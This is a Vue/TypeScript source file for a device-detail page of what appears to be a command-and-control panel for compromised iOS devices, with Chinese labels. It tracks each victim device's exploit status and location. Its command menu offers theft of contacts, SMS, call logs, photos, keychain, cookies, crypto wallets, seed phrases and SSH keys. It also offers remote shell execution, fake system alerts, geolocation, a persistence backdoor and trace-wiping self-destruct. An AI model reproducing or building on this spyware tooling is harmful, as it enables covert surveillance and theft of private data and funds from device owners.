<template>
  <div class="page-container">
    <!-- Back -->
    <div style="margin-bottom: 16px">
      <el-button @click="router.back()">
        <el-icon><ArrowLeft /></el-icon> 返回列表
      </el-button>
    </div>

    <div v-loading="loading">
      <!-- Device Info -->
      <el-card shadow="hover">
        <template #header>
          <div style="display: flex; justify-content: space-between; align-items: center">
            <span>设备信息 - {{ device.device_uuid }}</span>
            <div>
              <el-dropdown trigger="click" @command="(cmd: string) => setExploitStatus(cmd)" style="margin-right: 8px">
                <el-button size="small" :type="exploitTagType(device.exploit_status) === 'success' ? 'success' : 'info'">
                  利用状态<el-icon class="el-icon--right"><ArrowDown /></el-icon>
                </el-button>
                <template #dropdown>
                  <el-dropdown-menu>
                    <el-dropdown-item command="success" :disabled="device.exploit_status === 'success'">
                      <el-tag type="success" size="small" effect="dark">已利用</el-tag>
                      <span style="margin-left: 8px">标记 exploit 成功</span>
                    </el-dropdown-item>
                    <el-dropdown-item command="pending" :disabled="device.exploit_status === 'pending'">
                      <el-tag type="warning" size="small">待利用</el-tag>
                      <span style="margin-left: 8px">标记等待利用</span>
                    </el-dropdown-item>
                    <el-dropdown-item command="failed" :disabled="device.exploit_status === 'failed'">
                      <el-tag type="danger" size="small">失败</el-tag>
                      <span style="margin-left: 8px">标记利用失败</span>
                    </el-dropdown-item>
                    <el-dropdown-item command="unsupported" :disabled="device.exploit_status === 'unsupported'">
                      <el-tag type="info" size="small">不支持</el-tag>
                      <span style="margin-left: 8px">标记不支持</span>
                    </el-dropdown-item>
                  </el-dropdown-menu>
                </template>
              </el-dropdown>
              <el-button size="small" @click="editDialogVisible = true">
                <el-icon><Edit /></el-icon> 编辑
              </el-button>
              <el-button size="small" type="danger" @click="deleteDevice">
                <el-icon><Delete /></el-icon> 删除
              </el-button>
            </div>
          </div>
        </template>
        <el-descriptions :column="3" border>
          <el-descriptions-item label="UUID">{{ device.device_uuid }}</el-descriptions-item>
          <el-descriptions-item label="型号">{{ device.device_model || '-' }}</el-descriptions-item>
          <el-descriptions-item label="硬件型号">{{ device.hw_model || '-' }}</el-descriptions-item>
          <el-descriptions-item label="系统版本">
            <span v-if="device.os_version" style="font-weight: 600">
              {{ device.os_type === 'iOS' ? 'iOS ' : '' }}{{ device.os_version }}
            </span>
            <span v-else style="color: #c0c4cc">-</span>
          </el-descriptions-item>
          <el-descriptions-item label="芯片">{{ device.chipset || '-' }}</el-descriptions-item>
          <el-descriptions-item label="IP">{{ device.ip || '-' }}</el-descriptions-item>
          <el-descriptions-item label="IP位置">{{ device.ip_location || '-' }}</el-descriptions-item>
          <el-descriptions-item label="状态">
            <el-tag :type="statusTagType(device.status)" :effect="device.status === 'online' ? 'dark' : 'light'" size="small">
              {{ statusText(device.status) }}
            </el-tag>
          </el-descriptions-item>
          <el-descriptions-item label="利用状态">
            <el-tag :type="exploitTagType(device.exploit_status)" :effect="exploitEffect(device.exploit_status)" size="small">
              {{ exploitText(device.exploit_status) }}
            </el-tag>
          </el-descriptions-item>
          <el-descriptions-item label="启用">
            <el-tag :type="device.enabled ? 'success' : 'danger'">{{ device.enabled ? '启用' : '禁用' }}</el-tag>
          </el-descriptions-item>
          <el-descriptions-item label="渠道">{{ device.channel_name || '-' }}</el-descriptions-item>
          <el-descriptions-item label="分组">{{ device.group_name || '-' }}</el-descriptions-item>
          <el-descriptions-item label="模板">{{ device.template_name || '-' }}</el-descriptions-item>
          <el-descriptions-item label="User Agent" :span="3">{{ device.user_agent || '-' }}</el-descriptions-item>
          <el-descriptions-item label="Host">{{ device.host || '-' }}</el-descriptions-item>
          <el-descriptions-item label="Referer">{{ device.referer || '-' }}</el-descriptions-item>
          <el-descriptions-item label="访问路径">{{ device.access_path || '-' }}</el-descriptions-item>
          <el-descriptions-item label="首次出现">{{ device.first_seen || '-' }}</el-descriptions-item>
          <el-descriptions-item label="最后活跃">
            <span v-if="device.last_seen" :style="lastSeenStyle(device.last_seen)">
              {{ formatTime(device.last_seen) }}
            </span>
            <span v-else style="color: #c0c4cc">-</span>
          </el-descriptions-item>
          <el-descriptions-item label="电话号码">{{ device.phone_number || '-' }}</el-descriptions-item>
          <el-descriptions-item label="备注" :span="3">{{ device.note || '-' }}</el-descriptions-item>
        </el-descriptions>
      </el-card>

      <!-- Tabs -->
      <el-tabs style="margin-top: 16px" v-model="activeTab">
        <!-- Heartbeats -->
        <el-tab-pane label="心跳记录" name="heartbeats">
          <el-table :data="heartbeats" border stripe size="small">
            <el-table-column label="时间" prop="created_at" width="180" />
            <el-table-column label="状态" prop="status" width="100" />
            <el-table-column label="IP" prop="ip" width="140" />
            <el-table-column label="数据" prop="data" show-overflow-tooltip />
          </el-table>
          <el-pagination
            v-model:current-page="hbPage.page"
            :total="hbPage.total"
            :page-size="50"
            layout="total, prev, pager, next"
            style="margin-top: 10px"
            @current-change="loadHeartbeats"
          />
        </el-tab-pane>

        <!-- Device Logs -->
        <el-tab-pane label="设备日志" name="logs">
          <div style="margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center">
            <el-select v-model="logLevelFilter" placeholder="按级别筛选" clearable size="small" style="width: 140px" @change="loadDeviceLogs">
              <el-option label="全部" value="" />
              <el-option label="info" value="info" />
              <el-option label="warn" value="warn" />
              <el-option label="error" value="error" />
              <el-option label="debug" value="debug" />
            </el-select>
            <el-button size="small" type="danger" @click="clearLogs">清除日志</el-button>
          </div>
          <el-table :data="deviceLogs" border stripe size="small" max-height="500">
            <el-table-column label="时间" prop="time" width="180">
              <template #default="{ row }">
                <span :style="logTimeStyle(row.time)">{{ row.time || '-' }}</span>
              </template>
            </el-table-column>
            <el-table-column label="级别" prop="level" width="80">
              <template #default="{ row }">
                <el-tag :type="logLevelType(row.level)" size="small">{{ row.level || '-' }}</el-tag>
              </template>
            </el-table-column>
            <el-table-column label="类型" prop="type" width="120" show-overflow-tooltip>
              <template #default="{ row }">
                {{ row.type || '-' }}
              </template>
            </el-table-column>
            <el-table-column label="来源" prop="source" width="100" show-overflow-tooltip>
              <template #default="{ row }">
                {{ row.source || '-' }}
              </template>
            </el-table-column>
            <el-table-column label="消息" min-width="200" show-overflow-tooltip>
              <template #default="{ row }">
                <div v-if="row.title || row.detail">
                  <span v-if="row.title" style="font-weight: 600">{{ row.title }}</span>
                  <span v-if="row.title && row.detail" style="color: #909399"> — </span>
                  <span v-if="row.detail" style="color: #606266">{{ row.detail }}</span>
                </div>
                <span v-else style="color: #c0c4cc">-</span>
              </template>
            </el-table-column>
            <el-table-column label="IP" prop="ip" width="130" />
            <el-table-column label="标签" width="100">
              <template #default="{ row }">
                <el-tag v-if="row.tags" size="small" type="info">{{ row.tags }}</el-tag>
                <span v-else style="color: #c0c4cc">-</span>
              </template>
            </el-table-column>
          </el-table>
        </el-tab-pane>

        <!-- Command History -->
        <el-tab-pane label="命令历史" name="commands">
          <div style="margin-bottom: 10px">
            <el-button size="small" type="primary" @click="cmdDialogVisible = true">
              <el-icon><Plus /></el-icon> 发送命令
            </el-button>
          </div>
          <el-table :data="commands" border stripe size="small">
            <el-table-column label="ID" prop="id" width="60" />
            <el-table-column label="命令" prop="command" show-overflow-tooltip />
            <el-table-column label="状态" prop="status" width="100">
              <template #default="{ row }">
                <el-tag :type="cmdStatusType(row.status)" size="small">{{ row.status }}</el-tag>
              </template>
            </el-table-column>
            <el-table-column label="输出" prop="output" show-overflow-tooltip />
            <el-table-column label="创建时间" prop="created_at" width="180" />
            <el-table-column label="操作" width="120">
              <template #default="{ row }">
                <el-button text size="small" @click="retryCommand(row)" v-if="row.status !== 'pending'">重试</el-button>
                <el-button text size="small" @click="cancelCommand(row)" v-if="row.status === 'pending'">取消</el-button>
              </template>
            </el-table-column>
          </el-table>
        </el-tab-pane>
      </el-tabs>
    </div>

    <!-- Edit Dialog -->
    <el-dialog v-model="editDialogVisible" title="编辑设备" width="500px">
      <el-form :model="editForm" label-width="100px">
        <el-form-item label="分组">
          <el-select v-model="editForm.group_id" clearable filterable style="width: 100%">
            <el-option v-for="g in groups" :key="g.id" :label="g.name" :value="g.id" />
          </el-select>
        </el-form-item>
        <el-form-item label="渠道">
          <el-select v-model="editForm.channel_id" clearable filterable style="width: 100%">
            <el-option v-for="c in channels" :key="c.id" :label="c.name" :value="c.id" />
          </el-select>
        </el-form-item>
        <el-form-item label="状态">
          <el-select v-model="editForm.status" clearable style="width: 100%">
            <el-option label="在线" value="online" />
            <el-option label="离线" value="offline" />
            <el-option label="活跃" value="active" />
          </el-select>
        </el-form-item>
        <el-form-item label="启用">
          <el-switch v-model="editForm.enabled" />
        </el-form-item>
        <el-form-item label="备注">
          <el-input v-model="editForm.note" type="textarea" :rows="3" />
        </el-form-item>
      </el-form>
      <template #footer>
        <el-button @click="editDialogVisible = false">取消</el-button>
        <el-button type="primary" :loading="editLoading" @click="saveEdit">保存</el-button>
      </template>
    </el-dialog>

    <!-- Send Command Dialog (with command selector) -->
    <el-dialog v-model="cmdDialogVisible" title="发送命令" width="620px" @open="onCmdDialogOpen">
      <el-form label-position="top">
        <el-form-item label="目标设备">
          <el-input :model-value="device.device_uuid" disabled />
        </el-form-item>

        <el-form-item label="命令分类">
          <el-select v-model="cmdCategory" placeholder="选择命令分类" style="width: 100%" @change="onCategoryChange">
            <el-option v-for="cat in commandCategories" :key="cat.value" :label="cat.label" :value="cat.value">
              <span style="float: left">{{ cat.label }}</span>
              <span style="float: right; color: #909399; font-size: 12px">{{ cat.count }} 条</span>
            </el-option>
          </el-select>
        </el-form-item>

        <el-form-item v-if="cmdCategory" label="选择命令">
          <el-select v-model="cmdSelected" placeholder="选择具体命令" style="width: 100%" filterable @change="onCommandSelect">
            <el-option v-for="cmd in filteredCommands" :key="cmd.value" :label="cmd.label" :value="cmd.value">
              <span style="float: left">{{ cmd.label }}</span>
              <span style="float: right; color: #909399; font-size: 12px">{{ cmd.desc }}</span>
            </el-option>
          </el-select>
        </el-form-item>

        <el-form-item v-if="cmdNeedsPath" label="文件路径">
          <el-input v-model="cmdPath" :placeholder="cmdPathPlaceholder" />
        </el-form-item>

        <el-form-item v-if="cmdNeedsText" :label="cmdTextLabel">
          <el-input v-model="cmdText" :placeholder="cmdTextPlaceholder" />
        </el-form-item>

        <el-form-item v-if="cmdNeedsDepth" label="递归深度">
          <el-input-number v-model="cmdDepth" :min="1" :max="5" />
        </el-form-item>

        <el-form-item label="最终命令预览">
          <el-input :model-value="cmdPreview" type="textarea" :rows="2" readonly />
        </el-form-item>

        <el-alert v-if="cmdWarning" :title="cmdWarning" type="warning" show-icon :closable="false" style="margin-bottom: 12px" />
      </el-form>
      <template #footer>
        <el-button @click="cmdDialogVisible = false">取消</el-button>
        <el-button type="primary" :loading="cmdLoading" :disabled="!cmdPreview" @click="confirmSendCommand">发送命令</el-button>
      </template>
    </el-dialog>
  </div>
</template>

<script setup lang="ts">
import { ref, reactive, computed, onMounted, inject } from 'vue'
import { useRoute, useRouter } from 'vue-router'
import { devicesApi, commandsApi, channelsApi } from '@/api/modules'
import { ElMessage, ElMessageBox } from 'element-plus'
import { ArrowDown } from '@element-plus/icons-vue'

const route = useRoute()
const router = useRouter()
const withOtpRetry = inject('withOtpRetry') as <T>(fn: (otp?: string) => Promise<T>) => Promise<T>

const deviceUuid = route.params.deviceUuid as string
const loading = ref(true)
const device = ref<Record<string, any>>({})
const activeTab = ref('heartbeats')

const heartbeats = ref<any[]>([])
const deviceLogs = ref<any[]>([])
const commands = ref<any[]>([])
const groups = ref<any[]>([])
const channels = ref<any[]>([])

const hbPage = reactive({ page: 1, total: 0 })
const logLevelFilter = ref('')

async function loadDevice() {
  loading.value = true
  try {
    const res: any = await devicesApi.detail(deviceUuid)
    device.value = res || {}
  } catch {
    // handled
  } finally {
    loading.value = false
  }
}

async function loadHeartbeats() {
  try {
    const res: any = await devicesApi.heartbeats(deviceUuid, 50, (hbPage.page - 1) * 50)
    heartbeats.value = res?.items || res || []
    hbPage.total = res?.total ?? heartbeats.value.length
  } catch {
    // ignore
  }
}

async function loadDeviceLogs() {
  try {
    const res: any = await devicesApi.logs(deviceUuid, 100)
    let logs = res?.items || res || []
    // 客户端按级别筛选
    if (logLevelFilter.value) {
      logs = logs.filter((l: any) => (l.level || '').toLowerCase() === logLevelFilter.value.toLowerCase())
    }
    deviceLogs.value = logs
  } catch {
    // ignore
  }
}

async function loadCommands() {
  try {
    const res: any = await commandsApi.list({ device_uuid: deviceUuid, limit: 100 })
    commands.value = res?.items || res || []
  } catch {
    // ignore
  }
}

async function loadOptions() {
  try {
    const [grpRes, chRes] = await Promise.all([
      devicesApi.groups(),
      channelsApi.list({ limit: 1000 }),
    ])
    groups.value = (grpRes as any)?.items || (grpRes as any) || []
    channels.value = (chRes as any)?.items || (chRes as any) || []
  } catch {
    // ignore
  }
}

// Edit
const editDialogVisible = ref(false)
const editLoading = ref(false)
const editForm = reactive({
  group_id: null as number | null,
  channel_id: null as number | null,
  status: '',
  enabled: true,
  note: '',
})

async function saveEdit() {
  editLoading.value = true
  try {
    const data: Record<string, any> = {}
    if (editForm.group_id !== null) data.group_id = editForm.group_id
    if (editForm.channel_id !== null) data.channel_id = editForm.channel_id
    if (editForm.status) data.status = editForm.status
    data.enabled = editForm.enabled
    if (editForm.note !== undefined) data.note = editForm.note
    await withOtpRetry((otp) => devicesApi.patch(deviceUuid, data, otp))
    ElMessage.success('保存成功')
    editDialogVisible.value = false
    loadDevice()
  } catch {
    // handled
  } finally {
    editLoading.value = false
  }
}

async function deleteDevice() {
  try {
    await ElMessageBox.confirm('确定要删除此设备吗？', '确认', { type: 'warning' })
    await withOtpRetry((otp) => devicesApi.delete(deviceUuid, otp))
    ElMessage.success('删除成功')
    router.push('/devices')
  } catch {
    // cancelled
  }
}

async function clearLogs() {
  try {
    await ElMessageBox.confirm('确定要清除设备日志吗？', '确认', { type: 'warning' })
    await withOtpRetry((otp) => devicesApi.clearLogs(deviceUuid, otp))
    ElMessage.success('日志已清除')
    loadDeviceLogs()
  } catch {
    // cancelled
  }
}

// ==================== Exploit Status ====================
async function setExploitStatus(status: string) {
  const statusLabel: Record<string, string> = {
    success: '已利用',
    pending: '待利用',
    failed: '失败',
    unsupported: '不支持',
  }
  try {
    await ElMessageBox.confirm(
      `确定要将设备 ${device.value.device_uuid} 的利用状态标记为「${statusLabel[status] || status}」吗？\n\n标记为「已利用」后即可对该设备下发所有命令。`,
      '确认修改利用状态',
      { confirmButtonText: '确认', cancelButtonText: '取消', type: 'warning' }
    )
    await withOtpRetry((otp) => devicesApi.patch(deviceUuid, { exploit_status: status }, otp))
    device.value.exploit_status = status
    ElMessage.success(`利用状态已标记为：${statusLabel[status] || status}`)
  } catch {
    // cancelled or error
  }
}

// ==================== Command Selector ====================
interface CmdDef {
  value: string
  label: string
  desc: string
  category: string
  needsPath?: boolean
  pathPlaceholder?: string
  pathDefault?: string
  needsText?: boolean
  textLabel?: string
  textPlaceholder?: string
  textDefault?: string
  needsDepth?: boolean
  depthDefault?: number
  noArgs?: boolean
  warning?: string
}

const commandCategories = [
  { value: 'exfil',   label: '数据窃取', count: 0 },
  { value: 'sandbox', label: '沙箱收集', count: 0 },
  { value: 'wallet',  label: '钱包/密钥', count: 0 },
  { value: 'file',    label: '文件操作', count: 0 },
  { value: 'shell',   label: 'Shell 执行', count: 0 },
  { value: 'ui',      label: 'UI 交互', count: 0 },
  { value: 'recon',   label: '侦察/信息', count: 0 },
  { value: 'persist', label: '持久化/控制', count: 0 },
]

const allCommands: CmdDef[] = [
  // ---- 数据窃取（需要内核权限，未越狱设备会返回 [ERROR-no-bridge]）----
  { value: 'ds_exfil_contacts', label: '窃取通讯录', desc: 'AddressBook.sqlitedb', category: 'exfil', noArgs: true, warning: '需要内核权限（nativeBridge）。沙箱逃逸未成功时返回错误，可改用「沙箱收集」类命令' },
  { value: 'ds_exfil_sms',      label: '窃取短信记录', desc: 'sms.db', category: 'exfil', noArgs: true, warning: '需要内核权限（nativeBridge）。沙箱逃逸未成功时返回错误，可改用「沙箱收集」类命令' },
  { value: 'ds_exfil_calls',    label: '窃取通话记录', desc: 'call_history.db', category: 'exfil', noArgs: true, warning: '需要内核权限（nativeBridge）。沙箱逃逸未成功时返回错误，可改用「沙箱收集」类命令' },
  { value: 'ds_exfil_photos',   label: '窃取相册照片', desc: 'DCIM 目录递归', category: 'exfil', noArgs: true, warning: '需要内核权限（nativeBridge）。沙箱逃逸未成功时返回错误，可改用 ds_screenshot 截取当前页面' },
  { value: 'ds_exfil_wifi',     label: '窃取 WiFi 配置', desc: 'com.apple.wifi.plist', category: 'exfil', noArgs: true, warning: '需要内核权限（nativeBridge）。沙箱逃逸未成功时返回错误' },
  { value: 'ds_exfil_files',    label: '窃取用户文件', desc: '/private/var/mobile 递归3层', category: 'exfil', noArgs: true, warning: '需要内核权限（nativeBridge）。沙箱逃逸未成功时返回错误' },
  { value: 'ds_exfil_keychain', label: '导出钥匙串', desc: 'Keychain dump', category: 'exfil', noArgs: true, warning: '需要内核权限（nativeBridge）。沙箱逃逸未成功时返回错误，可改用 ds_cookies 提取浏览器Cookie' },
  { value: 'ds_notes',          label: '窃取备忘录', desc: 'notes.sqlite', category: 'exfil', noArgs: true, warning: '需要内核权限（nativeBridge）' },
  { value: 'ds_history',        label: '窃取浏览器历史', desc: 'Safari History.db', category: 'exfil', noArgs: true, warning: '需要内核权限（nativeBridge）' },
  { value: 'ds_voice_memos',    label: '窃取语音备忘录', desc: 'Recordings 目录', category: 'exfil', noArgs: true },

  // ---- 钱包/密钥 ----
  { value: 'ds_exfil_wallet',   label: '扫描所有加密钱包', desc: '14种钱包类型', category: 'wallet', noArgs: true, warning: '此命令会扫描设备上所有已安装的加密货币钱包' },
  { value: 'ds_wallets',        label: '导出所有钱包数据', desc: 'wallet.scan.all', category: 'wallet', noArgs: true },
  { value: 'ds_privkey',        label: '读取 SSH 私钥', desc: '~/.ssh/id_rsa', category: 'wallet', noArgs: true },
  { value: 'ds_phrase',         label: '读取助记词数据库', desc: 'phrase.db', category: 'wallet', noArgs: true },

  // ---- 文件操作 ----
  { value: 'ds_file_ls',        label: '列出目录', desc: 'file.list', category: 'file', needsPath: true, pathPlaceholder: '目录路径，如 /private/var/mobile', pathDefault: '/private/var/mobile' },
  { value: 'ds_file_read',      label: '读取文件', desc: 'file.read', category: 'file', needsPath: true, pathPlaceholder: '文件路径，如 /etc/passwd' },
  { value: 'ds_file_download',  label: '下载文件', desc: 'file.read', category: 'file', needsPath: true, pathPlaceholder: '文件完整路径' },
  { value: 'ds_file_recursive', label: '递归列目录', desc: 'file.recursive', category: 'file', needsPath: true, needsDepth: true, pathPlaceholder: '目录路径', pathDefault: '/private/var/mobile', depthDefault: 3 },
  { value: 'ds_file_stat',      label: '文件属性', desc: 'stat', category: 'file', needsPath: true, pathPlaceholder: '文件/目录路径', pathDefault: '/private/var/mobile' },

  // ---- Shell 执行 ----
  { value: 'ds_shell',          label: '执行 Shell 命令', desc: 'shell.exec', category: 'shell', needsText: true, textLabel: 'Shell 命令', textPlaceholder: '如 whoami / ls -la /var' },
  { value: 'ds_exec',           label: '执行程序', desc: 'shell.exec', category: 'shell', needsText: true, textLabel: '程序及参数', textPlaceholder: '如 ps aux' },
  { value: 'ds_apps',           label: '列出已安装应用', desc: 'ls Application', category: 'shell', noArgs: true },

  // ---- UI 交互 ----
  { value: 'ds_alert',          label: '弹窗警告', desc: 'ui.alert', category: 'ui', needsText: true, textLabel: '弹窗内容', textPlaceholder: '如：系统需要更新', textDefault: '系统通知' },
  { value: 'ds_notify',         label: '系统通知', desc: 'ui.notify', category: 'ui', needsText: true, textLabel: '通知内容', textPlaceholder: '如：发现新版本', textDefault: '系统通知' },
  { value: 'ds_vibrate',        label: '震动设备', desc: 'ui.vibrate', category: 'ui', noArgs: true },
  { value: 'ds_location',       label: '获取地理位置', desc: 'geo.location', category: 'ui', noArgs: true },

  // ---- 沙箱收集（不需要内核权限，纯浏览器 API）----
  { value: 'ds_sandbox',        label: '收集沙箱数据', desc: '浏览器全部可访问数据', category: 'sandbox', noArgs: true },
  { value: 'ds_screenshot',     label: '截取当前页面', desc: 'Canvas 截图', category: 'sandbox', noArgs: true },
  { value: 'ds_cookies',        label: '提取浏览器Cookie', desc: 'document.cookie', category: 'sandbox', noArgs: true },
  { value: 'ds_storage',        label: '提取本地存储', desc: 'localStorage + sessionStorage', category: 'sandbox', noArgs: true },

  // ---- 侦察/信息 ----
  { value: 'ds_info',           label: '设备完整信息', desc: 'system.info', category: 'recon', noArgs: true },
  { value: 'ds_sysinfo',        label: '系统信息', desc: 'system.info', category: 'recon', noArgs: true },
  { value: 'ds_device',         label: '设备型号', desc: 'system.info', category: 'recon', noArgs: true },
  { value: 'ds_memory_dump',    label: '内存转储', desc: 'memory.dump', category: 'recon', noArgs: true, warning: '需要内核权限（nativeBridge），未越狱设备会返回错误' },
  { value: 'ds_screenshot',     label: '截取屏幕', desc: 'screenshot (Canvas)', category: 'recon', noArgs: true },

  // ---- 持久化/控制 ----
  { value: 'install_persist',   label: '安装持久化', desc: 'install_persist', category: 'persist', noArgs: true, warning: '此命令将在设备上安装持久化后门，请谨慎使用' },
  { value: 'persist_check',     label: '检查持久化状态', desc: 'persist_check', category: 'persist', noArgs: true },
  { value: 'persist_remove',    label: '移除持久化', desc: 'persist_remove', category: 'persist', noArgs: true },
  { value: 'self_destruct',     label: '自毁/清理痕迹', desc: 'self_destruct', category: 'persist', noArgs: true, warning: '此命令将清除所有利用痕迹，不可逆' },
]

// 更新分类计数
commandCategories.forEach((cat) => {
  cat.count = allCommands.filter((c) => c.category === cat.value).length
})

const cmdCategory = ref('')
const cmdSelected = ref('')
const cmdPath = ref('')
const cmdText = ref('')
const cmdDepth = ref(3)

const filteredCommands = computed(() => {
  if (!cmdCategory.value) return []
  return allCommands.filter((c) => c.category === cmdCategory.value)
})

const currentCmdDef = computed(() => {
  return allCommands.find((c) => c.value === cmdSelected.value)
})

const cmdNeedsPath = computed(() => !!currentCmdDef.value?.needsPath)
const cmdNeedsText = computed(() => !!currentCmdDef.value?.needsText)
const cmdNeedsDepth = computed(() => !!currentCmdDef.value?.needsDepth)
const cmdPathPlaceholder = computed(() => currentCmdDef.value?.pathPlaceholder || '')
const cmdTextLabel = computed(() => currentCmdDef.value?.textLabel || '文本参数')
const cmdTextPlaceholder = computed(() => currentCmdDef.value?.textPlaceholder || '')
const cmdWarning = computed(() => currentCmdDef.value?.warning || '')

const cmdPreview = computed(() => {
  const def = currentCmdDef.value
  if (!def) return ''
  let cmd = def.value
  if (def.needsPath && cmdPath.value) {
    cmd += ' ' + cmdPath.value
  } else if (def.needsPath && def.pathDefault && !cmdPath.value) {
    cmd += ' ' + def.pathDefault
  }
  if (def.needsDepth) {
    cmd += ' ' + (cmdDepth.value || def.depthDefault || 3)
  }
  if (def.needsText && cmdText.value) {
    cmd += ' ' + cmdText.value
  } else if (def.needsText && def.textDefault && !cmdText.value) {
    cmd += ' ' + def.textDefault
  }
  return cmd
})

function onCmdDialogOpen() {
  cmdCategory.value = ''
  cmdSelected.value = ''
  cmdPath.value = ''
  cmdText.value = ''
  cmdDepth.value = 3
}

function onCategoryChange() {
  cmdSelected.value = ''
  cmdPath.value = ''
  cmdText.value = ''
  cmdDepth.value = 3
}

function onCommandSelect() {
  const def = currentCmdDef.value
  if (!def) return
  cmdPath.value = def.pathDefault || ''
  cmdText.value = def.textDefault || ''
  cmdDepth.value = def.depthDefault || 3
}

// ==================== Send Command ====================
const cmdDialogVisible = ref(false)
const cmdLoading = ref(false)

async function confirmSendCommand() {
  if (!cmdPreview.value) {
    ElMessage.warning('请先选择命令')
    return
  }
  cmdLoading.value = true
  try {
    await withOtpRetry((otp) => commandsApi.create({ command: cmdPreview.value, device_uuid: deviceUuid }, otp))
    ElMessage.success('命令已发送')
    cmdDialogVisible.value = false
    loadCommands()
  } catch {
    // handled
  } finally {
    cmdLoading.value = false
  }
}

async function retryCommand(row: any) {
  try {
    await withOtpRetry((otp) => commandsApi.retry(row.id, otp))
    ElMessage.success('重试成功')
    loadCommands()
  } catch {
    // handled
  }
}

async function cancelCommand(row: any) {
  try {
    await withOtpRetry((otp) => commandsApi.cancel(row.id, otp))
    ElMessage.success('已取消')
    loadCommands()
  } catch {
    // handled
  }
}

// ==================== Tag/Formatters ====================
function statusTagType(status: string): any {
  const map: Record<string, string> = { online: 'success', offline: 'info', active: 'warning' }
  return map[status] || 'info'
}

function statusText(status: string) {
  const map: Record<string, string> = { online: '在线', offline: '离线', active: '活跃' }
  return map[status] || status || '-'
}

function exploitTagType(status: string): any {
  const map: Record<string, string> = {
    pending: 'warning',
    success: 'success',
    exploiting: 'warning',
    exploited: 'success',
    failed: 'danger',
    unsupported: 'info',
    none: 'info',
  }
  return map[status] || 'info'
}

function exploitEffect(status: string): any {
  if (status === 'success' || status === 'exploited') return 'dark'
  return 'light'
}

function exploitText(status: string) {
  const map: Record<string, string> = {
    pending: '待利用',
    success: '已利用',
    exploiting: '利用中',
    exploited: '已利用',
    failed: '失败',
    unsupported: '不支持',
    none: '未利用',
  }
  return map[status] || status || '-'
}

function logLevelType(level: string): any {
  const map: Record<string, string> = { info: 'info', warn: 'warning', error: 'danger', debug: '' }
  return map[level?.toLowerCase()] || ''
}

function logTimeStyle(time: string): Record<string, string> {
  if (!time) return {}
  const d = new Date(time)
  if (isNaN(d.getTime())) return {}
  const diff = Date.now() - d.getTime()
  if (diff < 5 * 60 * 1000) return { color: '#67c23a' }        // 5分钟内 - 绿色
  if (diff < 60 * 60 * 1000) return { color: '#e6a23c' }       // 1小时内 - 橙色
  if (diff < 24 * 60 * 60 * 1000) return { color: '#909399' }  // 1天内 - 灰色
  return { color: '#c0c4cc' }                                    // 超过1天 - 浅灰
}

function cmdStatusType(status: string): any {
  const map: Record<string, string> = { pending: 'warning', success: 'success', failed: 'danger', cancelled: 'info' }
  return map[status] || 'info'
}

function formatTime(time: string): string {
  if (!time) return '-'
  const d = new Date(time)
  if (isNaN(d.getTime())) return time
  const now = new Date()
  const diff = now.getTime() - d.getTime()
  const minutes = Math.floor(diff / 60000)
  const hours = Math.floor(diff / 3600000)
  const days = Math.floor(diff / 86400000)
  if (minutes < 1) return '刚刚'
  if (minutes < 60) return `${minutes}分钟前`
  if (hours < 24) return `${hours}小时前`
  if (days < 30) return `${days}天前`
  const mm = String(d.getMonth() + 1).padStart(2, '0')
  const dd = String(d.getDate()).padStart(2, '0')
  const hh = String(d.getHours()).padStart(2, '0')
  const mi = String(d.getMinutes()).padStart(2, '0')
  return `${mm}-${dd} ${hh}:${mi}`
}

function lastSeenStyle(time: string): Record<string, string> {
  if (!time) return {}
  const diff = Date.now() - new Date(time).getTime()
  if (diff < 5 * 60 * 1000) return { color: '#67c23a', fontWeight: '600' }
  if (diff < 60 * 60 * 1000) return { color: '#e6a23c', fontWeight: '500' }
  if (diff < 24 * 60 * 60 * 1000) return { color: '#909399' }
  return { color: '#c0c4cc' }
}

onMounted(() => {
  loadDevice()
  loadHeartbeats()
  loadDeviceLogs()
  loadCommands()
  loadOptions()
})
</script>
